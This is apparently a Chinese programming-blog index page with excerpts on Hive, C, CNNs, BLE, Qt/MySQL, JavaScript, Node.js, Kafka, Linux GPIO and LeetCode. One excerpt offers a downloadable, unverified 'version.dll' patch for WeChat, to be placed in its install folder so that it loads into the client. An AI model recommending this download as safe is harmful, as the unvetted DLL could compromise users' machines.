hive&gt; select ceil(3.1) ; 4 3）floor：向下取整
hive&gt; select floor(4.8); 4 8.2.3 字符串函数 1）substring：截取字符串
语法一：substring(string A, int start)
返回值：string
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5a3b3cc70f1fe4942e2b00859b841514/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cbd022c764cd37bee848c617b92c3e3a/" rel="bookmark">
			广东专升本C语言程序设计（完结）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		初心：在一个人摸索下十分痛苦，不知道哪里开始复习，真题以及视频都没有，我希望在自己摸索完之后，能把宝贵的经验分享给需要的人，也希望各位以后也可以帮助更多的人，接下来让我们一起开始学习C语言和数据结构吧！！！
座右铭：“莫问收获，但问耕耘”
目录
如何看懂一个程序：
基本数据类型
什么是变量：
变量为什么必须初始化：
1、先来看看未初始化的代码：
如何定义变量：
什么是进制：
常量在c语言中如何表示：
字符char：
常量以什么样的二进制代码存储在计算机中：（了解即可）
什么是字节：
char使用常见问题解析：
什么是ASCII：（具体的表可以在csdn搜索）
基本的输出（printf）的用法：
常用输出控制符包含如下：
为什么需要输出控制符：
用简单的scanf函数输入数据：
1、scanf函数的一般形式：
2、scanf的第一种用法：
3、scanf的第二种用法：
4、如何使用scanf编写出高质量的代码：
运算符基本概念（考试重点）：
1、c的运算符号：有以下几类：
C语言运算符优先级:
除法（/）运算符细节：
取余（%）运算符的细节：
逻辑运算符的细节：
1、！（非）代码例子：
2、&amp;&amp;（并且）代码例子：
3、&amp;&amp;（并且）的陷阱例子：
什么是表达式：
自增自减++、- -：
逗号运算符：
1、逗号表达式： 2、未使用表达式的值--------代码分析： 3、使用表达式的值--------代码分析： 三目运算符：
流程控制(是我们学习C语言的第一个重点)：
1、什么是流程控制：
2、流程控制的分类：
选择结构：
第一种形式if：
1、if最简单的用法：
2、if的范围问题（重点）：
3、if----else的用法：
4、if----else if----else 的用法：
5、C语言对真假的处理：
7、if的常见问题解析 ：
选择结构switch：
1、格式：
2、switch用法简介：
break的用法【重点】：
1、break不能直接用于if：
2、break不能直接用于if，除非if属于循环内部的一个子句：
3、在多层switch循环中，break只能终止距离它最近的switch！： continue的用法：
循环结构：
循环结构---for循环：
1、格式：
2、for循环执行流程：
3、for代码简单例子------计算1到4的总和： 4、for循环计算1-10之间的奇数例子：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cbd022c764cd37bee848c617b92c3e3a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b945d5f41f6ef779f3e5b69815a0aca6/" rel="bookmark">
			（三）卷积神经网络模型之——ZFnet
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 ZFnet来历ILSVRC历届冠军网络介绍以及CNN的大致演化过程ILSVRC介绍 ZFNet的贡献论文研究的贡献1、特征可视化2、特征提取的通用性3、对于遮挡的敏感性4、特征的层次分析5、对于CNN结构的改进6、特征结构选择 ZFNet所涉及的几个核心原理反池化过程反激活反卷积小结 ZFNet网络的结构原始论文中的feature map可视化结果分析特征可视化特征演变过程特征不变性ZFNet与AlexNet的对比遮挡图像来判断网络是否知道对象在原图中的位置图像的一致性分析 参考 ZFnet来历 ILSVRC 2013获胜者是来自Matthew Zeiler和Rob Fergus的卷积网络。它被称为ZFNet（Zeiler＆Fergus Net的简称）。ZFNet网络对AlexNet网络的结构做了改进，调整了架构的部分超参数，特别是改进了扩展中间卷积层的大小。
ZFNet是用人的名字命名的，那他到底出自哪篇论文呢？它出自Matthew D.Zeiler 和 Rob Fergus（纽约大学）2013年撰写的论文： 《Visualizing and Understanding Convolutional Networks》。链接网址为：论文链接，请点击
ILSVRC历届冠军网络介绍以及CNN的大致演化过程 LeNet：最早用于数字识别的CNN；
AlexNet：2012年ILSVRC比赛冠军，远超第二名的CNN，比LeNet更深，用多层小卷积叠加来替换单个的大卷积；
ZF Net：2013年ILSVRC冠军；
GoogleNet：2014年ILSVRC冠军；
VGGNet：2014年ILSVRC比赛中算法模型，效果率低于GoogleNet；
ResNet：2015年ILSVRC冠军，结构修正以适应更深层次的CNN训练。
ILSVRC介绍 ILSVRC（ImageNet Large Scale Visual Recognition Challenge）是近年来机器视觉领域最受追捧也是最具权威的学术竞赛之一，代表了图像领域的最高水平。
ImageNet数据集是ILSVRC竞赛使用的是数据集，由斯坦福大学李飞飞教授主导，包含了超过1400万张全尺寸的有标记图片。ILSVRC比赛会每年从ImageNet数据集中抽出部分样本，以2012年为例，比赛的训练集包含1281167张图片，验证集包含50000张图片，测试集为100000张图片。
ILSVRC竞赛的项目主要包括以下几个问题：
（1）图像分类与目标定位（CLS-LOC）
（2）目标检测（DET）
（3）视频目标检测（VID）
（4）场景分类（Scene）
ZFNet的贡献 ZFNet是在AlexNet基础上进行了一些细节的改动，网络结构上并没有太大的突破，只是在卷积核和步幅上面做了一些改动。
按照以前的观点，一个卷积神经网络的好坏我们只能通过不断地训练去判断，我也没有办法知道每一次卷积、每一次池化、每一次经过激活函数到底发生了什么，也不知道神经网络为什么取得了如此好的效果，那么只能靠不停的实验来寻找更好的模型。ZFNet所做的工作不少，但是最核心的其实就是一个。
核心意义：通过使用可视化技术揭示了神经网络各层到底在干什么，起到了什么作用。一旦知道了这些，如何调整我们的神经网络，往什么方向优化，就有了较好的依据。
主要工作：
（1）使用一个多层的反卷积网络来可视化训练过程中特征的演化及发现潜在的问题；
（2）同时根据遮挡图像局部对分类结果的影响来探讨对分类任务而言到底哪部分输入信息更重要。
总而言之，《Visualizing and Understanding Convolutional Networks》，可以说是CNN领域可视化理解的开山之作，这篇文献告诉我们CNN的每一层到底学习到了什么特征，然后作者通过可视化进行调整网络，提高了精度。
下面我们来着重看下《Visualizing and Understanding Convolutional Networks》这篇论文的主要内容以及做了什么样的贡献。
论文研究的贡献 1、特征可视化 使用反卷积、反池化、反激活函数去反可视化feature map ，通过feature map可以看出，特征分层次体系结构 ，以及我们可以知道前面的层学习的是物理轮廓、边缘、颜色、纹理等特征，后面的层学习的是和类别相关的抽象特征。这一个非常重要的结论，我们后面很多的微调手段都是基于此理论成果。再次强调这个结论：
结论一：CNN网络前面的层学习的是物理轮廓、边缘、颜色、纹理等特征，后面的层学习的是和类别相关的抽象特征。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b945d5f41f6ef779f3e5b69815a0aca6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/67c6a1b4c15f957e8e2b95f56cc5ef24/" rel="bookmark">
			【操作系统】进程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		进程： 进程是操作系统的核心，所有基于多道程序设计的操作系统都建立在进程的操作系统概念之上。多道程序由于并发执行和共享资源，打破了单道程序由于独占资源所具有的执行过程的封闭性。
程序和进程的区别: 程序是一个静态的实体，是指令的集合，它并无生命周期但可以长期保存，而进程是一个动态的实体，进程是竞争计算机系统资源的基本单元，也是调度执行的基本单位，它存在于程序的执行过程中，程序一旦被执行，进程就会被调度。
进程和程序存在多对对的关系，一个程序中可以多次使用进程的系统调用函数在程序执行后创建多个进程；一个进程也可以通过执行某个指定是程序来与不同的程序相关联。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a5661b544de31a75aa578b6ab91c6abe/" rel="bookmark">
			Android 蓝牙BLE连接、广播、数据传输流程分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		如今的社会已经从IT时代过渡到了DT时代，数据的重要性不言而喻。将数据安全快速的传输给对方是一件非常重要的事情，如今诞生了很多不同的传输技术，每一种传输技术都是为了和对方进行数据交互。BLE技术也是这样，它的最终目的就是为了在两个设备间进行数据交互。我们从BLE的本质出发，搞清楚它是如何实现数据交互的，也就真正搞清楚了BLE的工作原理。
下面从3个方面，逐步讲解BLE的数据收发过程。
本文结合nordic的代码和蓝牙核心规范5.2来进行介绍。本文认为你对BLE协议栈的各个层已经有了一个大概认识，对BLE协议栈还不太熟悉的朋友可以参看拙作：蓝牙低功耗(BLE)协议栈
一 广播
1.1 从设备
从设备想要别人能够发现自己就需要不停的进行广播。 Host层通过HCI层定义的接口来设置广播数据。
HCI层的命令格式如下图：
设置广播数据的命令格式如下图：
OpCode，0x0008，两个字节
parameter Total Length，一个字节，也就是Advertising_Data_Length，根据Advertising_Data计算得来
Advertising_Data, 由HCI 以上层传下来
事实上只有Advertising_Data会通过空中发送。Advertising_Data的格式如下：
详细介绍参看：蓝牙核心卷 5.2 , Vol 3, Part C, 11
可以看到广播数据可能有多个元素：AD Structure 1，AD Structure 2 … AD Structure N，每一个AD Structure的格式为，1个字节长度，一个字节AD Type，n个字节的AD Data。广播数据包也遵循一定的格式，广播包的数据格式参看：AD Type和Core Specification Supplement
LL层定义的广播报文的格式如下图：
1.用户设置广播参数和广播内容
ble_gap.h
//设置广播参数，以及广播类容
uint32_t sd_ble_gap_adv_set_configure(uint8_t *p_adv_handle, ble_gap_adv_data_t const *p_adv_data, ble_gap_adv_params_t const *p_adv_params)
设置广播参数，ocf=0x006，ogf=0x08
命令格式：
gap协议层会根据HCI层提供的接口来设置广播参数
设置广播数据，ocf=0x0008，ogf=0x08
gap协议层会根据HCI层提供的接口来设置广播数据
2. 开启广播
命令格式：
gap层提供的函数接口：uint32_t sd_ble_gap_adv_start(uint8_t adv_handle, uint8_t conn_cfg_tag)
HCI层提供的接口，ocf=0x00a，ogf=0x08
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a5661b544de31a75aa578b6ab91c6abe/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/52012d3f0173605d4885157fe7648939/" rel="bookmark">
			（二）QT5.14.2连接MySQL并使用QtableView显示数据表内容
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		系列文章目录 第一章：（一）QT5.14.2+MSVC2017(32位/64位)+MySQL连接
第二章：（二）QT5.14.2连接MySQL并使用QtableView显示数据表内容
文章目录 系列文章目录前言一、使用QSqlDatabase连接MySQL/基本命令二、QTableView显示数据表内容三、示例完整代码展示总结 前言 本文主要讲述了Qt下MySQL数据库的连接及对MySQL数据库进行操作的基本命令，并使用QTableView控件结合QSqlTableModel显示相应数据表的内容，这里写了一个比较简单的示例进行讲解，以便大家学习，如有错误之处，欢迎大家批评指正。
项目效果
提示：以下是本篇文章正文内容，下面案例可供参考
一、使用QSqlDatabase连接MySQL/基本命令 1.定义一个QSqlDatabase对象，设置好连接需要的各个属性（使用命令：mysql -P3307 -h127.0.0.1 -uroot -p123456;）
QSqlDatabase myDb; myDb = QSqlDatabase::addDatabase("QMYSQL"); myDb.setHostName("localhost"); //本地127.0.0.1 myDb.setPort(3307); //默认为3306，不需要这一句,我是指定连接 myDb.setDatabaseName("mytestdb"); //设置数据库名，需要一个已经存在的数据库 myDb.setUserName("root"); myDb.setPassword("123456"); if(!myDb.open()) { QMessageBox::warning(this,"Warning",QString("Unable to open database!")); return; } else { qDebug()&lt;&lt;"Connecting to the database successfully!"; ui-&gt;te_output-&gt;appendPlainText("Connecting to the database successfully!"); } 2.使用QSqlQuery对象来执行SQL语句，显示所有数据库（使用命令：show databases;）
QSqlQuery query(myDb); query.exec("show databases;"); 3.显示当前数据库（使用命令：select database();）
QSqlQuery query(myDb); query.exec("select database();"); 4.打开数据库（使用命令：use mytestdb;）
QSqlQuery query(myDb); query.exec("use mytestdb;"); 5.显示当前数据库中的数据表（使用命令：show tables;）
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/52012d3f0173605d4885157fe7648939/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2d14ac1026c7047be0099b8fcb5cab3e/" rel="bookmark">
			JS学习第10天——ES5中面向对象（原型和原型链、forEach、map、filter、some、every、trim、Object.keys、Object.defineProperty方法的使用）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 一、构造函数和原型1、构造函数2、原型prototype（显式原型属性）3、隐式原型__proto__（隐式原型属性）4、constructor构造函数5、构造函数、实例、原型对象三者的关系6、原型链7、JS成员查找机制8、原型对象this指向9、扩展内置对象 二、ES5中的继承1、call()2、通过构造函数继承父类型属性3、通过原型对象继承父类型方法 三、ES5中的新增方法1、数组方法2、字符串方法3、对象方法 四、小案例（查询商品案例） ES6中的类：面向对象（ES6中的类class、constructor构造函数、类的继承extends、super关键字）
一、构造函数和原型 在ES6之前，JS中没有类的概念，用构造函数来实现面向对象
创建对象的三种方式：① 对象字面量 ② new Object() ③ 自定义构造函数
1、构造函数 构造函数就是一个普通函数，习惯首字母大写，调用方式必须使用new关键字。
构造函数主要用来初始化对象，即为对象成员变量赋初始值。
// 将方法写在构造函数内 function Star(uname, age) { this.uname = uname; this.age = age; this.sing = function() { console.log('我会唱歌'); } } var ldh = new Star('刘德华', 18); var zxy = new Star('张学友', 19); console.log(ldh.sing === zxy.sing); // 结果：false，资源浪费 // new 在执行时会做4件事：① 在内存中创建一个新的空对象② 让this指向这个新对象③ 执行函数内的代码，给新对象添加属性和方法 ④返回新对象（因此构造函数不需要return） 《1》静态成员和动态成员
成员可以添加在构造函数本身，也可以添加到构造函数内部的this上
静态成员：在构造函数本身创建的成员，只能由构造函数本身访问
实例成员：在构造函数内部创建的成员，只能由实例对象访问
2、原型prototype（显式原型属性） 《1》构造函数存在浪费内存的问题
每创建一个实例对象，都要创建一次sing方法，在内存中开辟一个新的空间，这样存在浪费内存的问题
《2》原型prototype
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2d14ac1026c7047be0099b8fcb5cab3e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/71ea2c2a36721ba10817e54dd7fa1dee/" rel="bookmark">
			【物联网服务NodeJs-5天学习】第一天篇③ —— VsCode上运行第一个NodeJs 程序，配置自动重启插件 nodemon
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		【NodeJs-5天学习】第一天篇③ —— VsCode上运行第一个NodeJs 程序，配置自动重启插件 nodemon 1、项目说明2、项目步骤2.1 创建项目目录 —— HelloDemo2.2 创建 index.js 文件2.3 初始化npm —— package.json2.4 安装第三方库2.5 编写demo代码2.6 大功告成，跑起来 3、配置自动重启插件 nodemon3.1 全局安装3.2 测试nodemon命令3.3 解决脚本运行问题3.3.1 win+x 打开Windows PowerShell（管理员）3.3.2 输入set-ExecutionPolicy RemoteSigned ，输入a或者y3.3.3 输入get-executionpolicy结果为RemoteSigned表示成功 3.4 再次执行nodemon命令3.5 修改js代码，验证自动重启效果 4、总结 面向读者群体
❤️ 电子物联网专业同学，想针对硬件功能构造简单的服务器，不需要学习专业的服务器开发知识 ❤️❤️ 业余爱好物联网开发者，有简单技术基础，想针对硬件功能构造简单的服务器❤️❤️ 本篇创建记录 2023-03-12 ❤️❤️ 本篇更新记录 2023-03-12 ❤️ 技术要求
有HTML、CSS、JavaScript基础更好，当然也没事，就直接运行实例代码学习 专栏介绍
通过简短5天时间的渐进式学习NodeJs，可以了解到基本的服务开发概念，同时可以学习到npm、内置核心API（FS文件系统操作、HTTP服务器、Express框架等等），最终能够完成基本的物联网web开发，而且能够部署到公网访问。 🙏 此博客均由博主单独编写，不存在任何商业团队运营，如发现错误，请留言轰炸哦！及时修正！感谢支持！🎉 欢迎关注 🔎点赞 👍收藏 ⭐️留言📝
1、项目说明 本章介绍如何在VSCode上成功运行第一个 NodeJs 服务器程序，并且能在浏览器上能访问到服务器内容。同时配置自动重启插件 nodemon，保存即更新服务。
2、项目步骤 2.1 创建项目目录 —— HelloDemo 随意创建一个英文文件夹目录，这里博主创建为“HelloDemo”。
右键选择code打开
2.2 创建 index.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/71ea2c2a36721ba10817e54dd7fa1dee/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d33e97675934e22b0459edf937b2d3da/" rel="bookmark">
			docker中快速安装Kafka(单节点)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		docker中快速安装Kafka_单节点 1. 拉镜像2. 创建网络环境3. 运行zookeeper容器实例4. 运行kafka容器实例5. 启动kafka客户端容器实例6. 配置说明7. docker中topic常用命令操作1. 创建topic2. 查看所有topic信息 8. docker中生产者生产消息常用命令操作9. docker中消费者消费消息常用命令操作10. 进入kafka容器内部 官网：https://hub.docker.com/r/bitnami/kafka
1. 拉镜像 # 拉取zookeeper镜像 docker pull zookeeper:3.8.1 # 拉取Kafka镜像 docker pull bitnami/kafka:3.4.0 2. 创建网络环境 # docker网络命令帮助： docker network # 创建名称为zk-kafak的网络，使用bridge网络模式 docker network create zk-kafka --driver bridge 3. 运行zookeeper容器实例 docker run -d --name zk-server --network zk-kafka -e ALLOW_ANONYMOUS_LOGIN=yes --restart always zookeeper:3.8.1 #此镜像分别包括（zookeeper 客户端端口、追随者端口、选举端口、管理服务器端口），因此标准容器链接将使其自动可用于链接的容器。由于 Zookeeper “快速失败”，因此最好始终重新启动它。EXPOSE 2181 2888 3888 8080 4. 运行kafka容器实例 docker run -d --name kafka-server \ --network zk-kafka \ -e ALLOW_PLAINTEXT_LISTENER=yes \ -e KAFKA_CFG_ZOOKEEPER_CONNECT=zk-server:2181 \ -p 9092:9092 \ -p 9093:9093 \ --restart always \ bitnami/kafka:3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d33e97675934e22b0459edf937b2d3da/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5f1dcb0bf73ee48fd5cc225bc3df8e40/" rel="bookmark">
			JS学习第9天——ES6中面向对象（类class、constructor构造函数、类的继承extends、super关键字、面向对象tab栏切换案例）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 一、面向对象1、面向过程2、面向对象3、两者对比 二、ES6中的类和对象1、面向对象的思维特点2、对象3、类class4、类constructor构造函数 三、类的继承1、继承2、super()关键字3、注意点 四、面向对象案例 一、面向对象 两大编程思想：① 面向过程 ② 面向对象
1、面向过程 面向过程POP（(Process Oriented programming）：分析好了步骤，然后按照步骤解决问题
2、面向对象 面向对象OOP（(Object Oriented Programming）：以对象功能来划分问题，而不是步骤
面向对象特性
① 封装性 ② 继承性 ③ 多态性
3、两者对比 对比面向对象面向过程优点由于面对对象有封装、继承、多态性的特性，可以设计出低耦合的系统，使系统更加灵活、易维护、易复用、易扩展性能比面向对象高，适合跟硬件联系很紧密的东西，比如单片机缺点性能比面向过程低没有面对对象易于维护、易复用、易扩展 面向过程的方法写出来的程序像一份蛋炒饭，用面向对象写出来的程序像一份盖浇饭
二、ES6中的类和对象 1、面向对象的思维特点 ① 抽取（抽象）对象共用的属性和行为封装成一个类（模板）
② 对类进行实例化，获取类的对象
2、对象 在JS中，对象是一组无序的相关属性和方法的集合，所有的事物都是对象，比如字符串、数值、数组、函数等
对象是由属性和方法组成的，属性是事物的特征，方法是事物的行为
3、类class 在ES6中新增了类，通过class关键字声明一个类，之后以这个类来实例化对象
类抽取了对象的公共部分，通过类实例化一个具体的对象
创建类
class name { // 逻辑 } // 实例化类 var xxx = new class(); 注意：类必须使用 new 实例化对象
4、类constructor构造函数 constructor()方法是类的构造函数，用于传递参数，返回实例对象
通过new关键字生成对象实例时，会自动调用constructor()方法。如果没有显示定义，类内部会自动帮我们创建一个constructor()
《1》语法
class Person { constructor(name,age) { this.name = name; this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5f1dcb0bf73ee48fd5cc225bc3df8e40/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d2ba41391e0a8bf379433582b3d26975/" rel="bookmark">
			Java swing宿舍管理系统，窗体程序，完整源码、下载即可运行 功能强大
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天为大家分享一个java语言编写的宿舍管理系统，目前系统功能已经很全面，后续会进一步完善。整个系统界面漂亮，有完整得源码，希望大家可以喜欢。喜欢的帮忙点赞和关注。一起编程、一起进步
开发环境 开发语言为Java，开发环境Eclipse或者IDEA都可以。数据库采用：MySQL。运行主程序，或者执行打开JAR文件即可以运行本程序。
系统框架 利用JDK自带的SWING框架开发，对UI进行写优化，使得界面更加漂亮，更好灵活
主要功能 1 系统登陆：通过校验用户输入的用户名和密码，校验通过进入系统的主界面，否则提示用户名或者密码错，要求用户重新输入
2 房间管理：对房间进行增加、删除、修改等操作
3 学生管理：对学生信息进行日常管理。包括学生的增加、删除、修改
4 学生宿舍入职和退出
5 根据条件查询学生信息
6 根据相关信息查询宿舍信息，和该宿舍的入住情况
实现效果 1 登陆界面 2 主界面 3 修改密码 4 办理住宿 5 房间修改 6 用户信息维护 主要代码 package com.niit.window; import java.awt.BorderLayout; import java.awt.Font; import java.awt.event.ActionEvent; import java.awt.event.ActionListener; import java.awt.event.WindowEvent; import java.awt.event.WindowListener; import javax.swing.ImageIcon; import javax.swing.JDialog; import javax.swing.JFileChooser; import javax.swing.JLabel; import javax.swing.JMenu; import javax.swing.JMenuBar; import javax.swing.JOptionPane; import javax.swing.JPanel; import javax.swing.JFrame; import javax.swing.JMenuItem; import javax.swing.UIManager; import javax.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d2ba41391e0a8bf379433582b3d26975/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/935e4a539ec6d73d85ddd46cee58c435/" rel="bookmark">
			【题解】百度2020校招Web前端工程师笔试卷（第一批）：单选题、多选题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		题目来源
若有错误请指正！
单选 1
分页存储管理将进程的逻辑地址空间分成若干个页，并为各页加以编号，从0开始，若某一计算机主存按字节编址，逻辑地址和物理地址都是32位，页表项大小为4字节，若使用一级页表的分页存储管理方式，逻辑地址结构为页号（20位），页内偏移量（12位），则页的大小是（ ）字节？页表最大占用（ ）字节？
A 4KB，4MB
B 5KB，5MB
C 6KB，6MB
D 7KB，7MB
答：
A。
解：
技巧解法：
计算机是二进制的，所以答案一定是2的幂次，选A。
常规解法：
20位为页号，12位为页内偏移量。
则一页的大小为：212=4k，选A。 页内偏移决定一页的大小
页号为20位，说明有220=1M页，一页对应一个页表项，一个页表项大小4B，则页表最大占用1Mx4B=4M字节。 页号决定有多少页，进程的每一页对应一个页表项
其他相关知识：【操作系统】王道考研 p37-39 基本分页存储管理的基本概念、基本地址变换机构、具有快表的地址变换机构_karshey的博客-CSDN博客
2
下列程序的运行结果是什么？
setTimeout(function(){ console.log(1); }, 0) new Promise(function(resolve){ console.log(2); resolve(); console.log(3); }).then(function(){ console.log(4); }) console.log(5); A 2 3 5 4 1
B 1 2 3 5 4
C 2 5 4 3 1
D 2 4 3 5 1
答：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/935e4a539ec6d73d85ddd46cee58c435/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/80b2f713c8eb1bc07a7aa64529271a33/" rel="bookmark">
			微信文件只读模式怎么解除，一步解决新版微信接收文件为只读属性的问题，附带多开和消息防撤回功能
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 最近PC端微信又进行了一次版本更新，这次更新最令用户难受的一个“新功能”恐怕就是接收到的文件为“只读”属性了，用户要想在接收到的文件中保存修改，需要以“另存”一个副本的方式进行。可能微信官方是出于安全性考虑才做出的这一调整，但目前实属有点用不习惯。
现在有办法解除这个限制了，除此之外还有两个附加功能~
一、软件简介 这次问题的解决方案不是工具，而是一个补丁，这次的补丁更具有针对性，只对微信有效，这个补丁可以解除接收文件只读属性的限制、还支持消息防撤回（并带有撤回提示）以及实现PC端微信多开，且在微信更新后不需要重复执行打补丁的操作。
二、使用方法 使用方法非常简单，解压后只有一个文件：【version.dll】，我们找到微信安装目录中的【WeChat】文件夹，将【version.dll】复制进这个目录即可。
【注意】：补丁【version.dll】所在的文件夹必须是安装路径中【WeChat】文件夹，不要放错了路径，否则不起作用。如果安装时没有手动设置安装位置，则默认安装路径为：C:\Program Files (x86)\Tencent\WeChat
将补丁复制到指定位置后，重启应用即可~
补丁安装成功后，多次启动微信将出现多个登录窗口，轻松实现多开~
三、下载链接 https://pan.baidu.com/s/1P4Se1jspHcOKt4fFNOWyvw?pwd=luem https://donot996.lanzoub.com/iCOC70p80gej 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2b8fa07d31c160830e9c1acb84c8d9fb/" rel="bookmark">
			pinctrl和gpio子系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、pinctrl子系统简介
Linux驱动讲究驱动分离与分层，pinctrl和gpio子系统就是驱动分离与分层思想下的产物，pinctrl子系统主要工作内容如下：
获取设备树中的pin信息
根据获取到的pin信息来设置pin的复用功能
根据获取到的pin信息来设置pin的电气属性，比如上下拉、速度、驱动能力等
引脚的宏定义在imx6u-pinfunc.h这个头文件
设备树中添加pinctrl节点模板
1、创建对应的节点
同一个外设的pin都放到一个节点里面，打开imx6ull-alientek-emmc.dts，在iomuxc下面添加pinctrl_gpio_leds节点，添加完成后
pinctrl_gpio_leds: gpio-leds { fsl,pins = &lt; MX6UL_PAD_GPIO1_IO03__GPIO1_IO03 0x17059 &gt;; }; 其中fsl.pins是固定属性，里面写的是设备所使用的PIN配置信息
二、gpio子系统
设置好设备树以后就可以使用gpio子系统提供的API函数来操作指定的GPIO，gpio子系统向驱动开发人员屏蔽了具体的读写寄存器过程。gpio子系统常用的API函数有下面几个：
1、gpio_request函数
gpio_request 函数用于申请一个 GPIO 管脚，在使用一个 GPIO 之前一定要使用 gpio_request
进行申请，函数原型如下：
int gpio_request(unsigned gpio, const char *label) 函数参数和返回值含义如下：
gpio：要申请的 gpio 标号，使用 of_get_named_gpio 函数从设备树获取指定 GPIO 属性信
息，此函数会返回这个 GPIO 的标号。
label：给 gpio 设置个名字。
返回值：0，申请成功；其他值，申请失败。
2、gpio_free函数
如果不使用某个 GPIO 了，那么就可以调用 gpio_free 函数进行释放。函数原型如下：
void gpio_free(unsigned gpio) 函数参数和返回值含义如下：
gpio：要释放的 gpio 标号。
返回值：无。
3、gpio_direction_input函数
此函数用于设置某个 GPIO 为输入，函数原型如下所示：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2b8fa07d31c160830e9c1acb84c8d9fb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/85838d097f8c037fb5f49016f28350ab/" rel="bookmark">
			VMware Workstation改默认语言为中文
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		VMware Workstation改默认语言为中文 在桌面上找到VMware Workstation Pro的图标，右键，修改快捷方式里的目标属性，在最后加上
[空格]–locale zh_CN（这里的“[空格]”是让你输入一个空格） 如下图所示：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c2564f37039cd5ea8c307301b182001b/" rel="bookmark">
			C  去除字符串中重复字母(LeetCode)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		🌟前言 摆烂太久，好久没有更文了，小九和大家一起看看题写写题找回手感吧，也希望这篇文章可以帮助正在寻找解题答案的朋友，你们的支持就是我最大的动力！求三连！求关注呀！
🌟题目 去除重复字母,给你一个仅包含小写字母的字符串，请你去除字符串中重复的字母，使得每个字母只出现一次。需保证返回结果的字典序最小 (要求不能打乱其他字符的相对位置)示例1:
输入:"bcabc"
输出:"abc"
示例2:
输入:"cbacdcbc"
输出:"acdb" cbad,bacd,adcb
字典序: apple book
字典序最小，不能出现打乱字母相对位置;
🌟解题前捋清思路 特殊条件 在写代码时要考虑会遇到的特殊情况，例如题目所指的“给你一个仅包含小写字母的字符串”，这个字符串它可能会给一个空字符，或者甚至一个字符，长度为1，这种情况我们就可以不用再进行去重这操作了写代码时，我们也要有这种意识，例如在写链表时，考虑链表为空
记录字母出现频率 用一个数组record记录字符串中字母出现的次数，次数我们遍历一遍字符串即可，因为要统计的是小写字母，而有且只有26个，所以我们的数组定义26个空间即可，record[26]
建字符栈stack 这里的栈呢，本质上就是一个连续的数组，用来模拟栈的思想，但不用完全按照栈的格式去写，我们只需要参考栈的一个特点：“先进后出”，作用：存储去除重复字母的结果，利用栈来正确次序。
遍历字符串 遍历字符串会有一个特殊的地方，那就是当前字符，对其进行判断，在0~top的空间里，判断当前字符是否存在栈中，用一个标记即可
如果已经存在，就让record[s[i]]--,代表去除了一个重复的s[i]位置上对应的字母，表示stack已经有了这个字符，不需要再进行存入又取出，然后继续遍历下一个字符；
若不存在，则通过while循环找到正确位置。以bcabc字符串为例，此时的字符a，通过循环，判断栈中元素是否要出栈，找到a的正确位置
判断条件
栈不能为空top&gt;-1
栈顶元素要大于遍历到的当前字符 stack[top]&gt;s[i]
